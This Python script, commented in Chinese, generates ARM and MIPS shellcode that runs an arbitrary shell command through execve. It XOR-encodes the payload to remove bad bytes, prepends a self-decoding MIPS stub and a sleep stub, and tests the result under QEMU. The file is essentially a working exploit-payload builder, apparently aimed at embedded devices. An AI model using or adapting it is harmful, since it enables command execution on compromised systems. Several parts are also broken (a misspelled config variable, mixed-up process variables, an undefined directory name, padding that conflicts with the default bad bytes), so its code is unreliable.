import shutil
import sys
import os
import tempfile
import subprocess
import argparse
import random
import urllib.parse

# --- 配置你的交叉编译器路径 ---
current_user = os.getlogin()
config = {
    # ARM 编译器路径 (例如: arm-linux-musleabi-gcc)
    "ARM_TOOLCHAIN_PATH": f"/{current_user}/armv7-eabihf--uclibc--stable-2024.05-1/bin/",
    # MIPS 编译器路径 (例如: mips-linux-gnu-gcc)
    "MIPS_TOOLCHAIN_PATH": f"/{current_user}/mips32--glibc--stable-2024.05-1/bin/",
    "DOWNLOAD_MIPS_TOOLCHAIN_URL": "https://toolchains.bootlin.com/downloads/releases/toolchains/mips32/tarballs/mips32--glibc--stable-2024.05-1.tar.xz"
}


class generate_raw_shellcode:
    def __init__(self, cmd, arch, save_file=False):
        self.cmd = cmd
        self.arch = arch
        self.save_file = save_file
        self.objdump_process = None
        self.xxd_bin_file = None
        self.raw_shellcode = None
        self.generate()

    def generate(self):
        """
        根据指定的架构(arm/mips)和命令生成对应的shellcode。

        Args:
            cmd (str): 希望shellcode执行的命令，例如 "ls -l"。
            arch (str): 目标架构，'arm' 或 'mips'。

        Returns:
            bytes: 生成的原始二进制shellcode。
        """
        # --- 1. 根据架构选择不同的内联汇编和编译器 ---
        if self.arch.lower() == 'arm':
            # ARM的execve系统调用号是 11
            # r7=syscall_num, r0=filename, r1=argv, r2=envp
            asm_code = """
            __asm__ volatile (
                "mov r7, %0\\n\\t"
                "mov r0, %1\\n\\t"
                "mov r1, %2\\n\\t"
                "mov r2, #0\\n\\t"
                "svc #0\\n\\t"
                :
                : "i"(11), "r"(arg0), "r"(args)
                : "r0", "r1", "r2", "r7"
            );
            """
            compiler_cmd = f"{confg['ARM_TOOLCHAIN_PATH']}/arm-buildroot-linux-uclibcgnueabihf-gcc-13.3.0"
            objcopy_cmd = f"{config['ARM_TOOLCHAIN_PATH']}/arm-buildroot-linux-uclibcgnueabihf-objcopy"
            odjdump_cmd = f"{config['ARM_TOOLCHAIN_PATH']}/arm-buildroot-linux-uclibcgnueabihf-objdump"
        elif self.arch.lower() == 'mips':
            # MIPS (O32 ABI) 的execve系统调用号是 4011
            # $v0=syscall_num, $a0=filename, $a1=argv, $a2=envp
            asm_code = """
            __asm__ volatile (
                "li $v0, 4011\\n\\t"
                "move $a0, %0\\n\\t"
                "move $a1, %1\\n\\t"
                "li $a2, 0\\n\\t"
                "syscall\\n\\t"
                :
                : "r"(arg0), "r"(args)
                : "$v0", "$a0", "$a1", "$a2"
            );
            """
            # 你需要将这里的命令替换成你的MIPS交叉编译器
            compiler_cmd = f"{config['MIPS_TOOLCHAIN_PATH']}/mips-buildroot-linux-gnu-gcc"
            objcopy_cmd = f"{config['MIPS_TOOLCHAIN_PATH']}/mips-buildroot-linux-gnu-objcopy"
            odjdump_cmd = f"{config['MIPS_TOOLCHAIN_PATH']}/mips-buildroot-linux-gnu-objdump"
        else:
            raise ValueError(f"不支持的架构: {self.arch}. 请选择 'arm' 或 'mips'.")

        # --- 2. 构建完整的C语言源码 ---
        # 使用C代码动态构建字符串和参数数组
        shellcode_c = f"""
    #include <sys/syscall.h>

    void _start() {{
        // 构建 execve 的参数
        {self.format_c_char_array("arg0", "/bin/sh")}
        {self.format_c_char_array("arg1", "-c")}
        {self.format_c_char_array("arg2", self.cmd)}

        char *args[] = {{arg0, arg1, arg2, 0}};

        // 执行特定架构的内联汇编
        {asm_code}
    }}
    """
        # --- 3. 编译并提取二进制代码 ---
        # 使用临时文件来处理编译过程
        # temp_dir = tempfile.gettempdir()
        base_name = os.path.join("./", f"shellcode_{os.getpid()}")
        c_file = f"{base_name}.c"
        elf_file = f"{base_name}"
        bin_file = f"{base_name}.bin"

        try:
            with open(c_file, "w") as fd:
                fd.write(shellcode_c)

            # 编译C代码为ELF文件
            # -nostdlib: 不链接标准库，对于shellcode至关重要
            # -static: 静态链接，避免依赖动态库
            # -O0: 关闭优化，确保代码行为与源码一致
            compile_process = subprocess.run(
                [compiler_cmd, "-fno-stack-protector", "-nostdlib", "-static", "-O0", "-o", elf_file, c_file],
                capture_output=True, text=True
            )
            if compile_process.returncode != 0:
                print("[-] 编译失败:", file=sys.stderr)
                print(compile_process.stderr, file=sys.stderr)
                return b''

            # 从ELF文件中提取纯二进制的.text段
            objcopy_process = subprocess.run(
                [objcopy_cmd, "-O", "binary", "-j", ".text", elf_file, bin_file],
                capture_output=True, text=True
            )
            if objcopy_process.returncode != 0:
                print("[-] Objcopy 失败:", file=sys.stderr)
                print(objcopy_process.stderr, file=sys.stderr)
                return b''

            objdump_process = subprocess.run(
                [odjdump_cmd, "-D", "-b", "binary", "-m", self.arch.lower(), bin_file],
                capture_output=True, text=True
            )
            self.objdump_process = objdump_process

            # 读取生成的二进制shellcode
            xxd_bin_file = subprocess.run(
                ["xxd", "-i", bin_file],
                capture_output=True, text=True
            )
            self.xxd_bin_file = xxd_bin_file

            with open(bin_file, "rb") as fd:
                raw_shellcode = fd.read()
            self.raw_shellcode = raw_shellcode
        finally:
            # 清理临时文件
            if self.save_file == False:
                for f in [c_file, elf_file, bin_file]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print(f"\n[+] 中间文件已保存:")
                print(f"  - C源码: {c_file}")
                print(f"  - ELF文件: {elf_file}")
                print(f"  - 二进制: {bin_file}")

    def format_c_char_array(self, var_name, string):
        """
        将一个Python字符串格式化为C语言的字符数组初始化代码。
        例如: "sh" -> char sh[3]; sh[0] = 's'; sh[1] = 'h'; sh[2] = '\0';
        """
        output = []
        length = len(string) + 1  # 为空终止符 '\0' 增加空间
        output.append(f"char {var_name}[{length}];")
        for i, c in enumerate(string):
            # 处理C语言中的特殊字符转义
            if c == "'":
                c_repr = "\\'"
            elif c == '\\':
                c_repr = '\\\\'
            elif c == '\n':
                c_repr = '\\n'
            elif c == '\t':
                c_repr = '\\t'
            else:
                c_repr = c
            output.append(f"{var_name}[{i}] = '{c_repr}';")
        output.append(f"{var_name}[{length - 1}] = '\\0';")
        return "\n".join(output)


class XorEncoder:
    def __init__(self, raw_shellcode, bad_bytes=None):
        """
        初始化XOR编码器。

        Args:
            raw_shellcode (bytes): 需要被编码的原始二进制shellcode。
            bad_bytes (list, optional): 不应出现的坏字节列表 (整数形式)。默认为 [0x00, 0x0a, 0x26]。
        """
        # --- 1. 初始化属性 ---
        self.raw_shellcode = raw_shellcode
        # 使用三元表达式来设置默认的坏字节列表
        self.bad_bytes_list = bad_bytes if bad_bytes is not None else [0x00, 0x0a, 0x26]

        # 使用集合进行快速查找，效率更高
        self.bad_bytes_set = set(self.bad_bytes_list)

        # 初始化将要计算的属性
        self.key = None
        self.xor_encoded_shellcode = None
        self.xor_encoded_shellcode_bin_file = "xor_encoded_shellcode.bin"

        print("[+] 开始进行XOR编码，处理坏字节...")
        print(f"    -- 定义的坏字节: {[hex(b) for b in self.bad_bytes_list]}")

        # --- 2. 立即执行编码流程 ---
        self.generate()

    def _pad_shellcode(self):
        """
        将shellcode填充到4字节的倍数，以进行安全的DWORD操作。
        使用 NOP (0x00) 指令进行填充，这是一个常见的做法。
        """
        padding_needed = (4 - len(self.raw_shellcode) % 4) % 4
        padded_shellcode = self.raw_shellcode
        if padding_needed > 0:
            print(f"    -- Shellcode长度不是4的倍数，需要用 NOP 填充 {padding_needed} 字节。")
            # NOP指令的字节表示
            nop_instruction = b'\x00'
            # 检查NOP指令本身是否是坏字节
            if 0x00 in self.bad_bytes_set:
                raise ValueError("填充字节 0x00 是一个坏字节，无法进行填充。请考虑其他填充方案。")
            padded_shellcode += nop_instruction * padding_needed
        return padded_shellcode

    def generate(self):
        """
        循环寻找安全的XOR密钥并加密payload。
        一个安全的密钥及其加密后的shellcode都不应包含任何坏字节。
        """
        padded_shellcode = self._pad_shellcode()

        attempts = 0
        max_attempts = 100000  # 设定最大尝试次数，防止无限循环
        print("    -- 正在寻找安全的XOR密钥...")

        while True:
            attempts += 1
            if attempts > max_attempts:
                raise RuntimeError(f"在 {max_attempts} 次尝试后仍未找到安全密钥。请检查坏字节列表或shellcode。")

            # 随机生成一个4字节（32位）的密钥
            key_int = random.randint(1, 0xFFFFFFFF)
            key_bytes = key_int.to_bytes(4, 'big')

            # 1. 检查密钥本身是否包含坏字节
            if any(b in self.bad_bytes_set for b in key_bytes):
                continue  # 密钥不安全，尝试下一个

            # 2. 使用此候选密钥加密整个shellcode
            encoded_buffer = bytearray()
            is_encoded_safe = True
            for i in range(0, len(padded_shellcode), 4):
                chunk = padded_shellcode[i:i + 4]
                dword = int.from_bytes(chunk, 'big')
                xored_dword_int = dword ^ key_int
                xored_dword_bytes = xored_dword_int.to_bytes(4, 'big')

                # 3. 检查加密后的块是否包含坏字节
                if any(b in self.bad_bytes_set for b in xored_dword_bytes):
                    is_encoded_safe = False
                    break  # 此密钥生成的编码不安全，停止当前加密并尝试新密钥

                encoded_buffer.extend(xored_dword_bytes)

            # 如果整个编码过程都安全，我们就找到了最终的密钥和编码
            if is_encoded_safe:
                self.key = key_int
                self.xor_encoded_shellcode = bytes(encoded_buffer)
                print(f"[+] 成功！在 {attempts} 次尝试后找到安全密钥: {hex(self.key)}")

                # 将编码后的shellcode写入文件
                try:
                    with open(self.xor_encoded_shellcode_bin_file, "wb") as f:
                        f.write(self.xor_encoded_shellcode)
                    print(f"    -- 编码后的Shellcode已保存到: {self.xor_encoded_shellcode_bin_file}")
                except IOError as e:
                    print(f"[!] 错误：无法将文件写入磁盘: {e}")

                return  # 成功找到密钥，退出函数


class XorDecoder:
    """
    负责管理解码器模板，并组装最终的shellcode。
    """
    MIPS_DECODER_TEMPLATE = """
    .section .text
    .global __start
    .set noreorder
    __start:
    li $t8, -0x666
    p:
    bltzal $t8, p
    slti $t8, $zero, -1
    li $s1, {val_for_payload_start}
    nor $s1, $s1, $s1
    addu $s1, $ra, $s1
    li $t2, {val_for_loop_count}
    nor $t2, $t2, $t2
    addu $t0, $t2, $t2
    addu $t0, $t0, $t0
    addu $t0, $s1, $t0
    lui $t1, {key_high}
    ori $t1, $t1, {key_low}
    decode_loop:
    lw $t6, -4($t0)
    nor $t5, $t1, $t1
    and $t4, $t6, $t5
    nor $t5, $t6, $t6
    and $t5, $t5, $t1
    or $t4, $t4, $t5
    sw $t4, -4($t0)
    addu $t0, $t0, -4
    addiu $t2, $t2, -1
    bne $t2, $zero, decode_loop
    slti $at, $at, -1
    finished:
    jalr $ra, $s1
    slti $at, $at, -1
    """

    def __init__(self, shellcode, key, val_for_payload_start, val_for_loop_count):
        """
        初始化XOR解码器。

        Args:
            shellcode (bytes): 需要被解码的加密二进制shellcode。
            key (int): 用于解码的密钥。
            verbose (bool): 如果为True，则打印详细的编译和调试信息。
        """
        self.shellcode = shellcode
        self.key = key
        self.val_for_payload_start = val_for_payload_start
        self.val_for_loop_count = val_for_loop_count
        self.xor_decoded_shellcode_bin_file = "decoded_shellcode.bin"
        self.xor_decoded_shellcode = None
        self._decode_len()

    def _decode_len(self):
        key_high = hex(self.key >> 16)
        key_low = hex(self.key & 0xFFFF)
        loop_count = len(self.shellcode) // 4
        val_for_loop_count = -(loop_count + 1)
        temp_asm = self.MIPS_DECODER_TEMPLATE.format(
            val_for_payload_start=self.val_for_payload_start, val_for_loop_count=self.val_for_loop_count,
            key_high=key_high, key_low=key_low
        )
        self._generate_decoder(temp_asm)
        offset_to_payload = len(self.xor_decoded_shellcode) - 8
        self.val_for_payload_start = -(offset_to_payload + 1)
        final_asm = self.MIPS_DECODER_TEMPLATE.format(
            val_for_payload_start=self.val_for_payload_start,
            val_for_loop_count=val_for_loop_count,
            key_high=key_high,
            key_low=key_low
        )
        self._generate_decoder(final_asm)

    def _generate_decoder(self, asm_code):
        """编译汇编代码并提取.text节，返回二进制数据和其长度。"""
        prefix = "mips-buildroot-linux-gnu-"
        base_path = os.path.join(config['MIPS_TOOLCHAIN_PATH'], prefix) if config['MIPS_TOOLCHAIN_PATH'] else prefix
        assembler_cmd = f"{base_path}as"
        objcopy_cmd = f"{base_path}objcopy"

        with tempfile.TemporaryDirectory() as temp_dir:
            s_file = os.path.join(temp_dir, "temp.s")
            o_file = os.path.join(temp_dir, "temp.o")
            bin_file = os.path.join(temp_dir, "temp.bin")

            with open(s_file, "w") as f:
                f.write(asm_code)

            porc = subprocess.run([assembler_cmd, "-o", o_file, s_file], capture_output=True)
            if porc.returncode != 0:
                raise RuntimeError(f"汇编失败:\n{proc.stderr.decode()}")

            porc = subprocess.run([objcopy_cmd, "-O", "binary", "-j", ".text", o_file, bin_file], capture_output=True)
            if porc.returncode != 0:
                raise RuntimeError(f"提取.text节失败:\n{proc.stderr.decode()}")
                shutil.copy(bin_file, self.xor_decoded_shellcode_bin_file)

            with open(bin_file, "rb") as f:
                binary_data = f.read()
                # 【关键修复】在返回前就移除末尾的空字节
                self.xor_decoded_shellcode = binary_data.rstrip(b'\x00')


class Sleep:
    """
    一个独立的类，专门用于生成一段MIPS sleep(0)存根的二进制shellcode。
    这段代码旨在通过强制上下文切换来解决指令缓存(I-Cache)同步问题。
    """

    # --- 类属性：MIPS汇编模板 ---
    # 这段代码实现了 sleep(0) 的功能，通过调用nanosleep系统调用。
    # 注意：它本身会包含'\x00'坏字节，因此它必须被上一层的解码器进行编码。
    MIPS_SLEEP_TEMPLATE = """
#
# MIPS Sleep 存根汇编模板 (支持链式调用)
# 功能: 调用 nanosleep 系统调用实现延时，然后跳转到下一段shellcode。
# 注意: 这段代码本身会包含 \x00 坏字节，需要被上一层的解码器进行编码。
#
.section .text
.global __start
.set noreorder

__start:
    # --- 使用 bltzal 技巧获取当前PC，用于计算下一段payload的地址 ---
    # 我们需要先知道自己在哪，才能计算出下一段代码在哪。
    li      $t8, -0x666
get_pc:
    bltzal  $t8, get_pc
    nop                         # 延迟槽。执行后，$ra会指向下一条指令

    # --- 计算下一段payload的地址并存入 $s0 ---
    # 从 addiu $s0... 到末尾的 nop 共有11条指令 (11 * 4 = 44字节)。
    # $ra 指向这个块的开头，所以加上44字节就是下一段payload的地址。
    addiu   $s0, $ra, 44

    # --- 以下是原始的 sleep 逻辑 ---
    # 为 timespec 结构体在栈上分配8字节空间
    addiu   $sp, $sp, -8

    # 设置 tv_sec (秒)
    li      $t0, 3
    sw      $t0, 0($sp)

    # 将 tv_nsec (纳秒) 设置为 0
    sw      $zero, 4($sp)

    # 准备并执行系统调用
    move    $a0, $sp
    li      $v0, 4166           # nanosleep 系统调用号
    syscall

    # 清理栈空间
    addiu   $sp, $sp, 8

    # --- [关键] 跳转到下一段payload ---
    # 不再返回(jr $ra)，而是跳转到我们计算好的、存放在$s0中的地址。
    jr      $s0
    nop                         # 延迟槽
"""

    def __init__(self, save_file=False, verbose=False):
        """
        初始化Sleep存根生成器。

        Args:
            save_file (bool): 如果为True，则在当前目录保存最终的.bin文件。
            verbose (bool): 如果为True，则打印详细的编译和调试信息。
        """
        self.save_file = save_file
        self.verbose = verbose
        self.bin_file_name = "sleep_stub.bin"
        self.Sleep_shellcode = None
        self.generate()

    def generate(self):
        """
        执行完整的编译流程，并返回二进制的sleep存根。

        Returns:
            bytes: 生成的二进制代码；如果失败则返回None。
        """
        # 确定交叉编译工具链的前缀
        prefix = "mips-buildroot-linux-gnu-"
        base_path = os.path.join(config['MIPS_TOOLCHAIN_PATH'], prefix) if config['MIPS_TOOLCHAIN_PATH'] else prefix
        compiler_cmd = f"{base_path}gcc"
        objcopy_cmd = f"{base_path}objcopy"

        # 使用临时目录来处理编译过程中的中间文件
        with tempfile.TemporaryDirectory() as temp_dir:
            base_name = os.path.join(temp_dir, "sleep_stub")
            s_file, o_file, bin_file = f"{base_name}.s", f"{base_name}.o", f"{base_name}.bin"

            # 将汇编模板写入.s文件
            with open(s_file, "w") as f:
                f.write(self.MIPS_SLEEP_TEMPLATE)

            if self.verbose:
                print(f"[Sleep Class] Compiling assembly file: {s_file}")

            # 编译汇编代码为对象文件(.o)
            # 使用 -c 选项只编译不链接，这是生成shellcode的关键
            compile_flags = [compiler_cmd, "-c", "-nostdlib", "-o", o_file, s_file]
            proc = subprocess.run(compile_flags, capture_output=True, text=True)
            if proc.returncode != 0:
                print(f"[-] Sleep存根编译失败:\n{proc.stderr}", file=sys.stderr)
                return None

            if self.verbose:
                print(f"[Sleep Class] Extracting .text section from {o_file}")

            # 从对象文件中提取.text节，生成纯二进制文件
            objcopy_flags = [objcopy_cmd, "-O", "binary", "-j", ".text", o_file, bin_file]
            proc = subprocess.run(objcopy_flags, capture_output=True, text=True)
            if proc.returncode != 0:
                print(f"[-] Sleep存根提取失败:\n{proc.stderr}", file=sys.stderr)
                return None

            # 读取最终的二进制数据
            with open(bin_file, "rb") as fd:
                sleep_shellcode = fd.read()
            self.Sleep_shellcode = sleep_shellcode
            if self.save_file:
                shutil.copy(bin_file, self.bin_file_name)
                print(f"[+] Sleep存根已保存为: {self.bin_file_name} ({len(sleep_shellcode)} bytes)")


class CTestHarnessGenerator:
    """
    一个用于生成、编译并执行C语言Shellcode测试框架的类。
    它接收原始的二进制数据(bytes)并自动格式化。
    """

    def __init__(self, shellcode_bytes):
        """
        初始化生成器。

        参数:
            shellcode_bytes (bytes): 完整的、最终的shellcode二进制数据。
        """
        if not isinstance(shellcode_bytes, bytes):
            raise TypeError("shellcode_bytes 参数必须是 bytes 类型。")
        self.shellcode_bytes = shellcode_bytes
        self.generate_and_run()

    def _format_shellcode_as_c_string(self):
        """
        [修正] 将二进制数据格式化为C语言的字符串字面量数组。
        """
        if not self.shellcode_bytes:
            return '    "";'
        c_string_lines = []
        for i in range(0, len(self.shellcode_bytes), 4):
            chunk = self.shellcode_bytes[i:i + 4]
            hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
            c_string_lines.append(f'"{hex_string}"')
        return '\n'.join(c_string_lines) + '\n;'

    def generate_and_run(self, output_filename="test_mips.c",
                         compiler_path="./mips32--glibc--stable-2024.05-1/bin/mips-buildroot-linux-gnu-gcc",
                         qemu_path="qemu-mips-static"):
        """
        生成、编译并执行完整的C语言测试文件。

        参数:
            output_filename (str): 要生成的C文件的名称。
            compiler_path (str): MIPS交叉编译器的路径。
            qemu_path (str): QEMU静态模拟器的路径。
        """
        # 1. [修正] 准备C代码前，先格式化shellcode
        formatted_shellcode = self._format_shellcode_as_c_string()
        final_c_code = f"""
#include <stdio.h>
#include <string.h>

char shellcode[] =
{formatted_shellcode}


void main(void)
{{
    printf("[+] Shellcode 大小: %zu 字节\\n", sizeof(shellcode) - 1);
    void (*s)(void) = (void (*)())shellcode;
    printf("[+] 准备执行shellcode...\\n");
    s();
    printf("[+] Shellcode 执行完毕。\\n");
}}
"""
        # 2. 写入文件
        try:
            with open(output_filename, "w") as f:
                f.write(final_c_code)
            print(f"[+] C语言测试文件 '{output_filename}' 已成功生成。")
        except IOError as e:
            print(f"[-] 错误: 写入文件 '{output_filename}' 失败: {e}")
            return

        # 3. 编译
        output_filename_base = os.path.splitext(output_filename)[0]
        compile_flags = [
            compiler_path,
            "-z", "execstack",
            "-static",
            "-g",
            "-o", output_filename_base,
            output_filename
        ]

        print(" --- [编译中] ---")
        print(f"    $ {' '.join(compile_flags)}")
        proc = subprocess.run(compile_flags, capture_output=True, text=True)
        if proc.returncode != 0:
            print(" [-] 编译失败!")
            print(" --- STDERR ---")
            print(proc.stderr)
            return

        print("[+] 编译成功!")
        # 4. 执行
        run_flags = [qemu_path, output_filename_base]
        print(" --- [执行中] ---")
        print(f"    $ {' '.join(run_flags)}")

        run_proc = subprocess.run(run_flags, capture_output=True, text=True)
        print(" --- STDOUT ---")
        print(run_proc.stdout)
        if run_proc.stderr:
            print(" --- STDERR ---")
            print(run_proc.stderr)


def check_toolschain():
    """
    检查目标目录是否存在。如果不存在，则从指定的URL下载tar.gz文件并解压到该目录。
    该函数依赖于系统已安装 'wget' 和 'tar' 命令。
    """
    # --- 2. 检查目标目录是否存在 ---
    if os.path.exists(config['MIPS_TOOLCHAIN_PATH']):
        print(f"✅ 目录 '{config['MIPS_TOOLCHAIN_PATH']}' 已存在，无需执行任何操作。")
        return True

    print(f"ℹ️ 目录 '{config['MIPS_TOOLCHAIN_PATH']}' 不存在，开始执行下载和解压任务...")

    # --- 3. 使用 wget 下载文件 ---
    try:
        filename = os.path.basename(urllib.parse.urlparse(config['DOWNLOAD_MIPS_TOOLCHAIN_URL']).path)
        print(f"🔽 正在从 '{config['DOWNLOAD_MIPS_TOOLCHAIN_URL']}' 下载文件...")
        # 构建并执行 wget 命令。-O 参数指定输出文件路径。
        wget_command = ["proxychains", "wget", config['DOWNLOAD_MIPS_TOOLCHAIN_URL'], "-O",
                        f"/home/{current_user}/{filename}"]
        # check=True 会在命令返回非零退出码时抛出异常
        subprocess.run(wget_command, check=True, capture_output=True)
        print(f"👍 下载成功，文件已保存至: /home/{current_user}/{filename}")
    except FileNotFoundError:
        print("❌ 错误: 'wget' 命令未找到。请确保它已安装并位于系统的 PATH 环境变量中。")
        return False
    except subprocess.CalledProcessError as e:
        # 捕获 wget 执行失败的错误
        print(f"❌ 使用 wget 下载失败。返回码: {e.returncode}")
        print(f"错误输出:\n{e.stderr.decode('utf-8', errors='ignore')}")
        return False

    # --- 4. 创建目录并使用 tar 解压文件 ---
    try:

        print(f"📦 正在将 '{filename}' 解压到 '/{current_user}/'...")
        print(filename)
        tar_command = ["tar", "-xf", f"/home/{current_user}/{filename}", "-C", f"/home/{current_user}/"]
        subprocess.run(tar_command, check=True, capture_output=True)
        print("👍 解压成功。")
    except FileNotFoundError:
        print("❌ 错误: 'tar' 命令未找到。请确保它已安装并位于系统的 PATH 环境变量中。")
        return False
    except subprocess.CalledProcessError as e:
        print(f"❌ 使用 tar 解压失败。返回码: {e.returncode}")
        print(f"错误输出:\n{e.stderr.decode('utf-8', errors='ignore')}")
        return False
    print(f"\n🎉 任务完成！所有文件已成功下载并解压到 '{TARGET_DIR}'。")
    return True


def print_as_c_string(data, var_name="shellcode"):
    """
    将二进制数据打印成C语言字符串字面量的格式。
    例如: "\xde\xad\xbe\xef"
    """
    print(f"char {var_name}[] =")
    # 每4个字节为一组，生成一行字符串
    for i in range(0, len(data), 4):
        # 获取当前行的数据块
        chunk = data[i:i + 4]
        # 将每个字节格式化为 \xHH 的形式
        hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
        # 打印被双引号包围的字符串
        print(f'    "{hex_string}"')
    print(";")


def print_as_python_bytes(data, var_name="shellcode", line_len=12):
    """
    将二进制数据打印成Python中通过 += 逐行构建字节字符串的格式。
    例如: buf += b"\\xde\\xad\\xbe\\xef"
    """
    # 首先打印初始化行
    print(f'{var_name} = b""')

    # 每次处理 line_len 个字节
    for i in range(0, len(data), line_len):
        # 获取当前行的数据块
        chunk = data[i:i + line_len]
        # 将每个字节格式化为 \xHH 的形式
        hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
        # 打印 "buf += b'...'" 格式的字符串
        print(f'{var_name} += b"{hex_string}"')


def main():
    # --- 使用 argparse 解析命令行参数 ---
    parser = argparse.ArgumentParser(
        description="为一个命令生成 ARM 或 MIPS 架构的 shellcode。",
        formatter_class=argparse.RawTextHelpFormatter  # 保持帮助文本格式
    )
    parser.add_argument("-arch", "--arch", choices=['arm', 'mips'], help="目标CPU架构 (arm 或 mips)")
    parser.add_argument("-cmd", "--cmd", help="要执行的命令")
    parser.add_argument("-sf", "--save_file", action="store_true", help="保存中间文件")
    parser.add_argument("-xor", "--xor_encode", action="store_true", help="对shellcode进行XOR编码")
    parser.add_argument("-s", "--sleep", action="store_true", help="在shellcode前面加上睡眠指令")
    args = parser.parse_args()

    # --- 1. 环境检查 ---
    check_toolschain()

    raw_shellcode_get = None
    if args.arch and args.cmd:
        print(f"[+] 正在为架构 '{args.arch}' 生成命令 '{args.cmd}' 的 shellcode...")
        raw_shellcode = generate_raw_shellcode(args.cmd, args.arch, args.save_file)
        raw_shellcode_get = raw_shellcode.raw_shellcode
        if raw_shellcode:
            # 以 \xde\xad\xbe\xef 的格式打印shellcode
            print("   -- Shellcode 生成成功(长度: " + str(len(raw_shellcode_get)) + " 字节):")
            print(''.join(f'\\x{b:02x}' for b in raw_shellcode_get))
            # print(raw_shellcode.xxd_bin_file.stdout)
            # print_as_c_string(raw_shellcode_get)
            print("-" * 30)
        else:
            print("\n[-] Shellcode 生成失败。请检查编译器路径和错误输出。")

    # xor_encode
    if args.xor_encode:
        if args.sleep:
            sleep = Sleep()
            raw_shellcode_get = (sleep.Sleep_shellcode + raw_shellcode_get)
        else:
            raw_shellcode_get = raw_shellcode_get
        xor_encoder = XorEncoder(raw_shellcode_get)
        print("    -- xor编码后的shellcode (长度: " + str(len(xor_encoder.xor_encoded_shellcode)) + " 字节):")
        print_as_python_bytes(xor_encoder.xor_encoded_shellcode)
        key = xor_encoder.key
        loop_count = len(xor_encoder.xor_encoded_shellcode) // 4
        val_for_loop_count = -(loop_count + 1)

        # --- 1. 生成解码器 ---
        print(
            f"[+] 正在为密钥 '{hex(xor_encoder.key)}' 和长度 '{len(xor_encoder.xor_encoded_shellcode)}' 生成MIPS解码器...")
        xor_decoder = XorDecoder(xor_encoder.xor_encoded_shellcode, key, "-1", "-1")
        print(
            f"    -- 解码器生成成功，密钥: {hex(xor_decoder.key)}，循环次数: {loop_count}，循环次数值: {val_for_loop_count}")
        print(f"    -- 解码器shellcode (长度 {str(len(xor_decoder.xor_decoded_shellcode))} 字节):")
        # --- 2. 打印解码后的shellcode ---
        print_as_python_bytes(xor_decoder.xor_decoded_shellcode)
        print("-" * 30)
        # 调用方法生成解码器
        if xor_decoder and xor_encoder:
            input_files = [xor_decoder.xor_decoded_shellcode_bin_file, xor_encoder.xor_encoded_shellcode_bin_file]
            output_file = 'merged.bin'

            # --- 2. 执行合并 ---
            with open(output_file, 'wb') as outfile:
                for filename in input_files:
                    try:
                        with open(filename, 'rb') as infile:
                            outfile.write(infile.read())
                    except FileNotFoundError:
                        print(f"跳过未找到的文件: {filename}")

            print(f"合并完成 (解码器shellcode + xor_encoded_shellcode) -> {output_file}")
            merged_xxd_output = subprocess.run(
                ["xxd", "-i", output_file],
                capture_output=True, text=True
            )
            # print(merged_xxd_output.stdout)
            merged_shellcode = xor_decoder.xor_decoded_shellcode + xor_encoder.xor_encoded_shellcode
            print_len = f"xor解码器长度({str(len(xor_decoder.xor_decoded_shellcode))}字节) + xor编码后的shellcode长度({str(len(xor_encoder.xor_encoded_shellcode))}字节) = {str(len(merged_shellcode))} 字节"
    else:
        merged_shellcode = raw_shellcode_get
        print_len = f"原始shellcode长度({str(len(raw_shellcode_get))}字节)"
    print(print_len)
    print_as_python_bytes(merged_shellcode)
    # xor解码器+xor编码后的shellcode合并测试
    CTestHarnessGenerator(merged_shellcode)


if __name__ == "__main__":
    main()
